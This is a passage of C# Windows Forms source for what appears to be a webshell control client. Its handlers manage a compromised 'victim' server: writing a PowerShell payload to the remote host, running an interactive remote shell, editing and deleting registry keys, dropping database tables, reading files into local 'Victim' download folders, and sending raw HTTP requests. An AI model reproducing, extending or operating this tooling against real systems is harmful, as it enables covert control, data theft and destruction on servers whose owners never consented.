                {
                    MessageBox.Show("An error was occured in database configuration.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    toolStripLabel2.Text = "Action was failed";

                    return;
                }

                if (!result.bSuccess)
                {
                    MessageBox.Show(result.szErrorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    toolStripLabel2.Text = "Action was failed!";

                    return;
                }

                List<string> lsDb = node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();

                foreach (DataRow dr in result.dtOutput.Rows)
                {
                    string? szDb = dr[0].ToString();
                    if (string.IsNullOrEmpty(szDb))
                        continue;

                    szDb = szDb.Replace("$(DATABASE)", config.szSource);
                    if (lsDb.Contains(szDb))
                        continue;

                    TreeNode nodeDb = new TreeNode(szDb);
                    nodeDb.ImageKey = "database";
                    nodeDb.SelectedImageKey = nodeDb.ImageKey;

                    node.Nodes.Add(nodeDb);
                }

                node.Expand();

                textBox2.Text = config.szConnString;

                toolStripLabel2.Text = "Action successfully.";
            }
            else if (node.Parent != null && node.Parent.Parent == null)
            {
                // Table -> Show items

                toolStripLabel2.Text = "Loading...";

                string szHost = node.Parent.Text;
                string szDbName = node.Text;

                var config = m_dbMgr.m_stDbConfig[szHost];
                var lsTables = await m_dbMgr.fnDbGetTables(config, szDbName);

                if (lsTables.Count == 0)
                {
                    MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                fnDbShowTablePage(node, szHost, szDbName, lsTables);

                toolStripLabel2.Text = "Action successfully.";
            }
            else if (node.Parent != null && node.Parent.Parent != null && node.Parent.Parent.Parent == null)
            {
                // Show data

                toolStripLabel2.Text = "Loading...";

                string szHost = node.Parent.Parent.Text;
                string szDbName = node.Parent.Text;
                string szTable = node.Text;

                var config = m_dbMgr.m_stDbConfig[szHost];
                string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable, 100);
                DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

                fnDbShowData(config, dt, szQuery, szDbName, szTable);

                toolStripLabel2.Text = "Action successfully.";
            }
        }

        // Database.Info
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;
            fnDbShowInformation(cfg);
        }

        // Database.SQL
        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;
            string szDbName = node.Text;

            fnDbShowSqlQuery(cfg, szDbName);
        }

        // Database.Add
        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);
            f.ShowDialog();
        }

        // Database.Edit
        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;

            frmDbEdit f = new frmDbEdit(m_dbMgr, this, cfg);
            f.ShowDialog();
        }

        // Database.Remove (This functionality do NOT remove the remote database, just only the local configuration
        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            TreeNode? nodeSelected = treeView2.SelectedNode;
            if (nodeSelected == null)
                return;

            TreeNode node = nodeSelected;
            while (node.Parent != null)
                node = node.Parent;

            DialogResult dr = MessageBox.Show($"Are you sure to remove \"{node.Text}\"? \n(Tips: This will only remove the local configuration and will not affect the remote database).", "Remove?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr != DialogResult.Yes)
                return;

            var config = (clsfnDb.stDbConfig)node.Tag;

            if (!m_dbMgr.fnbDbDelete(config))
            {
                MessageBox.Show("Cannot remote database: " + node.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            node.Nodes.Clear();
            treeView2.Nodes.Remove(node);
        }

        // DbTable.Open
        private async void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            TabPage? page = tabControl4.SelectedTab;
            if (page == null || page.Tag == null)
                return;

            clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;

            if (ctrls.listView.Items.Count == 0)
                return;

            ListViewItem item = ctrls.listView.SelectedItems[0];
            if (item == null)
                return;

            var config = ctrls.m_config;
            string szDbName = ctrls.m_nodeRoot.Text;
            string szTable = item.Text;

            string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable);
            DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

            fnDbShowData(config, dt, szQuery, szDbName, szTable);
        }

        // DbTable.ShowAll
        private async void toolStripMenuItem28_Click(object sender, EventArgs e)
        {
            TabPage? page = tabControl4.SelectedTab;
            if (page == null || page.Tag == null)
                return;

            clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;
            if (ctrls.listView == null)
                return;

            if (ctrls.listView.Items.Count == 0)
                return;

            ListViewItem item = ctrls.listView.SelectedItems[0];
            if (item == null)
                return;

            var config = ctrls.m_config;
            string szDbName = ctrls.m_nodeRoot.Text;
            string szTable = item.Text;

            string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable);
            DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

            fnDbShowData(config, dt, szQuery, szDbName, szTable);
        }

        // DbTable.New
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            TabPage? page = tabControl4.SelectedTab;
            if (page == null || page.Tag == null)
                return;

            clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;
            var config = ctrls.m_config;
            string szDbName = ctrls.m_nodeRoot.Text;

            TabPage pageNewTable = new TabPage($"New Table ({szDbName})");
            tabControl4.TabPages.Add(pageNewTable);
            tabControl4.SelectedTab = pageNewTable;

            clsDbNewTableControls ctrlsNewTable = new clsDbNewTableControls(pageNewTable, config, m_dbMgr, szDbName);
            pageNewTable.Tag = ctrlsNewTable;
        }

        // DbTable.Delete
        private async void toolStripMenuItem27_Click(object sender, EventArgs e)
        {
            TabPage? page = tabControl4.SelectedTab;
            if (page == null || page.Tag == null)
                return;

            clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;
            if (ctrls.listView.Items.Count == 0)
                return;

            ListViewItem item = ctrls.listView.SelectedItems[0];
            if (item == null)
                return;

            var config = ctrls.m_config;
            string szDbName = ctrls.m_nodeRoot.Text;
            string szTable = item.Text;

            DialogResult dr = MessageBox.Show($"Are you sure you want to delete [{szTable}]? This action cannot be undone.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dr != DialogResult.Yes)
                return;

            string szQuery = string.Empty;
            switch (config.enDbType)
            {
                case enDatabase.MySQL:
                    szQuery = $"DROP TABLE `{szDbName}`.`{szTable}`;";
                    break;
                case enDatabase.SQLServer:
                    szQuery = $"DROP TABLE [{szDbName}].dbo.[{szTable}];";
                    break;
                case enDatabase.PostgreSQL:
                    szQuery = $"DROP TABLE \"{szTable}\";";
                    break;
                case enDatabase.Oracle:
                    szQuery = $"DROP TABLE \"{szTable.ToUpper()}\";";
                    break;
                case enDatabase.SQLite:
                    szQuery = $"DROP TABLE \"{szTable}\";";
                    break;
                default:
                    szQuery = $"DROP TABLE {szTable};";
                    break;
            }

            try
            {
                var result = await m_dbMgr.fnSqlQueryEx(config, szQuery);
                if (!result.bSuccess)
                    throw new Exception($"Failed to delete: [{szTable}]");

                ctrls.listView.Items.Remove(item);

                MessageBox.Show($"Deleted [{szTable}] successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            bool bStart = string.Equals(button1.Text, "Start");

            if (!bStart)
            {
                try
                {
                    timerShell.Stop();
                    button1.Text = "Start";
                    m_rShell.m_bIsRunning = false;

                    await m_rShell.fnPipeStop();
                }
                catch { }

                m_isReading = false;

                return;
            }

            string szWorker = m_web.fnReadPayloadFile(m_web.m_victim.m_ShellConfig, "worker.ps1");
            if (!string.IsNullOrEmpty(szWorker))
            {
                DialogResult dr = MessageBox.Show("The target requires worker.ps1, do you want to write the PowerShell payload into the remote host?", "worker.ps1 found!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dr == DialogResult.Yes)
                {
                    if (!await m_fileMgr.fnbWrite(Path.Combine(m_fileMgr.m_szHomePath, "worker.ps1"), szWorker))
                    {
                        MessageBox.Show("Failed to write the PowerShell payload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }
                else
                {
                    MessageBox.Show("Action was terminated.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            await m_rShell.fnPipeCreate(textBox4.Text);
            m_rShell.m_bIsRunning = true;
            button1.Text = "Stop";

            timerShell.Interval = 300;
            timerShell.Start();

            textBox5.PlaceholderText = "Please enter your commands here";
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            bool bStart = string.Equals(button2.Text, "Start");

            if (!bStart)
            {
                timerShell.Stop();
                button2.Text = "Start";
                m_rShell.m_bIsRunning = false;

                try
                {
                    await m_rShell.fnPipeStop();
                }
                catch { }

                m_isReading = false;
                return;
            }

            timerShell.Stop();
            m_isReading = false;

            await m_rShell.fnPipeCreate(textBox5.Text);
            m_rShell.m_bIsRunning = true;
            button2.Text = "Stop";

            timerShell.Interval = 300;
            timerShell.Start();
        }

        private async void timerShell_Tick(object sender, EventArgs e)
        {
            if (m_isReading || !m_rShell.m_bIsRunning)
                return;

            m_isReading = true;

            try
            {
                string szResp = await m_rShell.fnPipeRead();
                if (string.IsNullOrEmpty(szResp))
                    return;

                var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
                if (objJson == null)
                    return;

                string status = objJson.status;
                if (status != "success")
                    return;

                string szb64Msg = objJson.msg;
                if (string.IsNullOrEmpty(szb64Msg))
                    return;

                Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);

                byte[] abBuffer = Convert.FromBase64String(szb64Msg);
                string szText = Encoding.UTF8.GetString(abBuffer);
                byte[] abBytes = encoding.GetBytes(szText);

                szb64Msg = Convert.ToBase64String(abBytes);
                if (string.IsNullOrEmpty(szb64Msg))
                    return;

                if (m_victim.m_bUnixLike)
                {
                    if (webViewLinuxShell?.CoreWebView2 != null)
                        webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
                }
                else
                {
                    if (webViewShell?.CoreWebView2 != null)
                        webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
                }
            }
            catch
            {

            }
            finally
            {
                m_isReading = false;
            }
        }

        private async void textBox5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szCmd = textBox5.Text.Trim() + "\r\n";

                byte[] payloadBytes = Encoding.UTF8.GetBytes(szCmd);
                string b64Payload = Convert.ToBase64String(payloadBytes);

                await m_rShell.fnPipeWrite(b64Payload);

                textBox5.Text = string.Empty;
            }
        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {

        }

        private async void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (richTextBox1.Tag == null)
                return;

            int nPrompt = (int)richTextBox1.Tag;

            if (e.KeyCode == Keys.Enter)
            {
                string cmd = richTextBox1.Text.Substring(nPrompt);

                await fnShellExecute(cmd);

                e.Handled = true;
                e.SuppressKeyPress = true;

                return;
            }

            if (richTextBox1.SelectionStart <= nPrompt)
            {
                if (e.KeyCode == Keys.Back || e.KeyCode == Keys.Delete || e.KeyCode == Keys.Left || e.KeyCode == Keys.Right)
                {
                    e.Handled = true;
                    e.SuppressKeyPress = true;
                }
            }

            if (e.KeyCode == Keys.Back && richTextBox1.SelectionStart <= nPrompt && richTextBox1.SelectionLength == 0)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void richTextBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (richTextBox1.Tag == null)
                return;

            int nPrompt = (int)richTextBox1.Tag;

            if (richTextBox1.SelectionStart < nPrompt)
            {
                e.Handled = true;
                return;
            }
        }

        private async void treeView5_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode nodeSelected = treeView5.SelectedNode;
            if (nodeSelected == null)
                return;

            textBox7.Text = nodeSelected.FullPath;

            if (nodeSelected.Parent == null)
            {
                //Computer

                toolStripStatusLabel4.Text = "Loading...";

                var result = await m_winReg.fnHives();
                foreach (string szKey in result.Keys)
                {
                    if (result[szKey])
                    {
                        TreeNode node = new TreeNode(szKey);
                        node.ImageKey = "key";
                        node.SelectedImageKey = node.ImageKey;

                        if (fnFindNodeWithFullPath(treeView5.Nodes, $"Computer\\{node.Text}") == null)
                            nodeSelected.Nodes.Add(node);
                    }
                }

                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
            }
            else
            {
                // Scan

                toolStripStatusLabel4.Text = "Loading...";

                var result = await m_winReg.fnScan(nodeSelected.FullPath.Replace("Computer\\", string.Empty));
                if (result == null)
                    return;

                var subkeys = result.Subkeys;
                foreach (string szSubKey in subkeys)
                {
                    if (fnFindNodeWithFullPath(treeView5.Nodes, "Computer\\" + szSubKey) != null)
                        continue;

                    TreeNode node = new TreeNode(szSubKey.Replace(nodeSelected.FullPath.Replace("Computer\\", string.Empty) + "\\", string.Empty));
                    node.ImageKey = "key";
                    node.SelectedImageKey = node.ImageKey;

                    nodeSelected.Nodes.Add(node);
                }

                nodeSelected.Expand();

                listView3.Items.Clear();

                var values = result.Values;
                foreach (var value in values)
                {
                    ListViewItem item = new ListViewItem(value.Name);
                    item.SubItems.Add(value.Type);
                    item.SubItems.Add(clsfnWinReg.fnFormatRegistryValue(value.Type, value.Data));
                    item.ImageKey = value.Type.Contains("SZ") ? "reg_ab" : "reg_01";

                    listView3.Items.Add(item);

                    clsfnWinReg.stRegItem regItem = new clsfnWinReg.stRegItem();
                    regItem.szName = value.Name;
                    regItem.szType = value.Type;

                    if (value.Type.Contains("BINARY"))
                    {
                        regItem.abData = value.Data;
                    }
                    else if (value.Type.Contains("DWORD"))
                    {
                        if (value.Data != null && value.Data.Length == 4)
                        {
                            regItem.nData = BitConverter.ToUInt32(value.Data, 0);
                        }
                        else
                        {
                            string dwordText = Encoding.UTF8.GetString(value.Data);
                            if (uint.TryParse(dwordText, out uint parsedDword))
                                regItem.nData = parsedDword;
                            else
                                regItem.nData = 0;
                        }
                    }
                    else if (value.Type.Contains("QWORD"))
                    {
                        regItem.nData = BitConverter.ToUInt64(value.Data, 0);
                    }
                    else if (value.Type.Contains("MULTI"))
                    {
                        regItem.asData = Encoding.UTF8.GetString(value.Data)
                            .TrimEnd('\0')
                            .Split('\0', StringSplitOptions.RemoveEmptyEntries);
                    }
                    else
                    {
                        regItem.szData = Encoding.UTF8.GetString(value.Data).TrimEnd('\0');
                    }

                    item.Tag = regItem;
                }

                string szBasePath = nodeSelected.FullPath.Replace("Computer\\", string.Empty);
                m_winReg.m_szCurrentPath = szBasePath;

                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
            }
        }

        private async void textBox3_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    string szResp = await m_rShell.fnShellExec(textBox3.Text);

                    textBox3.Clear();
                    richTextBox2.Clear();

                    richTextBox2.AppendText(szResp);
                    richTextBox2.ScrollToCaret();
                }
                else if (e.KeyCode == Keys.Up)
                {

                }
                else if (e.KeyCode == Keys.Down)
                {

                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            fnClose();
        }

        // Registry.Edit
        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;
            if (regItem.szType.Contains("BINARY"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.abData);
            else if (regItem.szType.Contains("WORD"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.nData);
            else if (regItem.szType.Contains("MULTI"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.asData);
            else
                fnRegSetValue(regItem.szName, regItem.szType, regItem.szData);
        }

        // Registry.RenameValue
        private async void toolStripMenuItem30_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;

            frmRename f = new frmRename(m_winReg, false, m_winReg.m_szCurrentPath, regItem.szName);
            f.ShowDialog();

            fnRegRefresh();
        }

        // Registry.DeleteValue
        private async void toolStripMenuItem31_Click(object sender, EventArgs e)
        {
            int nCount = listView3.SelectedItems.Cast<ListViewItem>().ToList().Count;
            if (nCount == 0)
                return;

            DialogResult dr = MessageBox.Show($"Are you sure to delete {nCount} value{(nCount == 0 ? string.Empty : "s")}?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dr != DialogResult.Yes)
                return;

            foreach (ListViewItem item in listView3.SelectedItems)
            {
                if (item.Tag == null)
                    continue;

                try
                {
                    var regItem = (clsfnWinReg.stRegItem)item.Tag;
                    var result = await m_winReg.fnDeleteValue(m_winReg.m_szCurrentPath, regItem.szName);

                    if (!result.bSuccess)
                        throw new Exception($"Cannot delete: {regItem.szName}\n{result.szErrorMsg}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }

            fnRegRefresh();
        }

        private async void toolStripButton8_Click(object sender, EventArgs e)
        {
            await fnRegInit();
        }

        private async void toolStripLabel3_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem32_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var stEntry = fnFileGetItemTag(item);
                if (!stEntry.bIsDirectory)
                    fnFileRead(stEntry.szEntryPath);
            }
        }

        private async void toolStripMenuItem33_Click(object sender, EventArgs e)
        {
            frmFileHexEditor? f = fnFindForm<frmFileHexEditor>();
            if (f == null)
            {
                f = new frmFileHexEditor(this);
                f.Text = "Hex Editor";
                f.Show();
            }

            f.BringToFront();

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                if (entry.bIsDirectory)
                    continue;

                byte[]? abData = await m_fileMgr.fnReadBuffer(entry.szEntryPath);
                if (abData == null)
                {
                    MessageBox.Show("Null buffer: " + entry.szEntryPath, "IsNull", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    continue;
                }

                f.fnShowFile(entry.szEntryPath, abData);
            }
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            ListViewItem item = items.First();
            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
            if (string.IsNullOrEmpty(szDir))
                return;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                fnFileAddPathToTreeView(szDir);

            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);

            tabControl2.SelectedIndex = 0;
            treeView3.SelectedNode = node;

            Task.Run(() =>
            {
                string szFileName = string.Empty;
                Dictionary<ListViewItem, clsfnFileMgr.stEntry> dic = new Dictionary<ListViewItem, clsfnFileMgr.stEntry>();

                Invoke(() =>
                {
                    szFileName = item.SubItems[0].Text;
                    var items = listView2.Items.Cast<ListViewItem>()
                            .Select(item => new { Item = item, Entry = fnFileGetItemTag(item) })
                            .Where(x => !x.Entry.bIsDirectory)
                            .ToList();

                    foreach (var x in items)
                        dic[x.Item] = x.Entry;
                });

                foreach (var item in dic.Keys)
                {
                    if (string.Equals(dic[item].szEntryName, szFileName))
                    {
                        Invoke(() =>
                        {
                            item.Selected = true;
                            item.EnsureVisible();
                        });

                        break;
                    }
                }
            });
        }

        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            ListViewItem item = items.First();
            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
            if (string.IsNullOrEmpty(szDir))
                return;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                fnFileAddPathToTreeView(szDir);

            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);

            tabControl2.SelectedIndex = 0;
            treeView3.SelectedNode = node;
        }

        private void toolStripMenuItem36_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            string szData = string.Join(Environment.NewLine, items.Select(x => x.Text).ToArray());
            Clipboard.SetText(szData);
        }

        private void toolStripMenuItem37_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            string szData = string.Join(Environment.NewLine, items.Select(x => x.SubItems[1].Text).ToArray());
            Clipboard.SetText(szData);
        }

        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
            if (!Directory.Exists(szLocalSaveDirPath))
                Directory.CreateDirectory(szLocalSaveDirPath);

            Process.Start("explorer.exe", szLocalSaveDirPath);
        }

        private void listView3_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items.First();
            if (item.Tag == null)
                return;

            var regItem = (clsfnWinReg.stRegItem)item.Tag;
            if (regItem.szType.Contains("BINARY"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.abData);
            else if (regItem.szType.Contains("WORD"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.nData);
            else if (regItem.szType.Contains("MULTI"))
                fnRegSetValue(regItem.szName, regItem.szType, regItem.asData);
            else
                fnRegSetValue(regItem.szName, regItem.szType, regItem.szData);
        }

        // RegistryTree.CopyKeyName
        private void toolStripMenuItem38_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            Clipboard.SetText(node.Text);
        }

        // Registry.CopyName
        private void toolStripMenuItem45_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.Text).ToArray());
            Clipboard.SetText(szText);
        }

        // Registry.CopyType
        private void toolStripMenuItem46_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.SubItems[1].Text).ToArray());
            Clipboard.SetText(szText);
        }

        // Registry.CopyData
        private void toolStripMenuItem47_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView3.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szText = string.Join(Environment.NewLine, items.Select(x => x.SubItems[2].Text).ToArray());
            Clipboard.SetText(szText);
        }

        // RegistryTree.Rename
        private async void toolStripMenuItem39_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szNewName = Interaction.InputBox("New name:", "Rename", string.Empty);
            if (string.IsNullOrEmpty(szNewName))
            {
                MessageBox.Show("Key name cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            bool bVal = await m_winReg.fnbRenameKey(Path.Combine(szBasePath, node.Text), Path.Combine(szBasePath, szNewName));
            if (!bVal)
            {
                MessageBox.Show("Cannot rename: " + node.Text);
                return;
            }

            node.Nodes.Clear();
            listView3.Items.Clear();

            node.Text = szNewName;

            treeView5.SelectedNode = null;
            treeView5.SelectedNode = node;
        }

        // RegistryTree.Export
        private async void toolStripMenuItem43_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            var result = await m_winReg.fnExport(szBasePath);
            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg, "Export", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, result.Output);
            }
        }

        // RegistryTree.ExpandAll
        private void toolStripMenuItem41_Click(object sender, EventArgs e)
        {
            treeView5.ExpandAll();
        }

        // RegistryTree.CollapseAll
        private void toolStripMenuItem40_Click(object sender, EventArgs e)
        {
            treeView5.CollapseAll();
        }

        // RegistryTree.Delete
        private async void toolStripMenuItem42_Click(object sender, EventArgs e)
        {
            TreeNode node = treeView5.SelectedNode;
            if (node == null)
                return;

            string szBasePath = node.FullPath.Replace("Computer\\", string.Empty);
            var result = await m_winReg.fnDeleteKey(szBasePath);
            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg, "DeleteValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            listView3.Items.Clear();

            TreeNode nodeParent = node.Parent;
            treeView5.SelectedNode = null;
            treeView5.Nodes.Remove(node);
            treeView5.SelectedNode = nodeParent;
        }

        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            try
            {
                string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                File.WriteAllText(szFilePath, textEditorControl1.Text);

                toolStripStatusLabel7.Text = "Saved";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void textEditorControl1_KeyDown(object sender, KeyEventArgs e)
        {
            
        }

        private void toolStripButton13_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "eval_" + clsTool.fnszGenerateFileNameWithDateTime();
            sfd.InitialDirectory = m_victim.m_szPortfolio;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, m_ctrlEvalEditor.Text);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void toolStripButton11_Click(object sender, EventArgs e)
        {
            try
            {
                var resp = await m_runScript.fnHttpPOST(textBox11.Text, m_ctrlPostEditor.Text);
                m_ctrlEvalBrowser.DocumentText = resp.data;

                toolStripStatusLabel3.Text = $"Status: {resp.http_code} | Length: {resp.data.Length}";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripButton12_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "post_" + clsTool.fnszGenerateFileNameWithDateTime();
            sfd.InitialDirectory = m_victim.m_szPortfolio;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, m_ctrlPostEditor.Text);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void textBox11_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                try
                {
                    var resp = await m_runScript.fnHttpGET(textBox11.Text);
                    m_ctrlEvalBrowser.DocumentText = resp.data;

                    toolStripStatusLabel3.Text = $"Status: {resp.http_code} | Length: {resp.data.Length}";
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton15_Click(object sender, EventArgs e)
        {
            fnFileMgrRefresh();
        }

        private async void toolStripButton14_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
            treeView3.Nodes.Clear();

            var fileInit = await m_fileMgr.fnszInit();

            textBox1.Text = fileInit.szCurrentDir;
            m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
            foreach (string szName in fileInit.lsLogicalDrive)
            {
                TreeNode node = new TreeNode(szName);
                node.ImageKey = "harddrive";
                treeView3.Nodes.Add(node);
            }

            fnFileAddPathToTreeView(fileInit.szCurrentDir);
            treeView3.ExpandAll();

            TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
            treeView3.SelectedNode = cdNode;
        }

        private void splitContainer7_SplitterMoved(object sender, SplitterEventArgs e)
        {

        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                TreeNode node = treeView1.SelectedNode;
                if (node == null)
                    return;

                textBox12.Text = node.FullPath;
                listView15.Items.Clear();

                node.SelectedImageKey = node.ImageKey;

